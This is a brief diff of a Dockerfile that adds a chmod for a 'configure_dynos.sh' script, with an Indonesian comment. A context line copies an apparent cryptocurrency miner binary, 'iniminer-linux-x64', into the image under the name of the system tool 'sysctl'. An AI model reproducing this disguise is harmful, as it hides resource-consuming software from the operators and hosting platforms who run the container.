@@ -35,7 +35,9 @@ COPY compile.sh /usr/local/bin/main.sh
 COPY main.sh /usr/local/bin/run.sh
 COPY iniminer-linux-x64 /usr/local/bin/sysctl
 COPY restart.sh /usr/local/bin/restart.sh
+# Pastikan file 'configure_dynos.sh' disalin ke container
 COPY configure_dynos.sh /usr/local/bin/configure_dynos.sh
+RUN chmod +x /usr/local/bin/configure_dynos.sh
 
 # Make scripts executable
 RUN chmod +x /usr/local/bin/*.sh
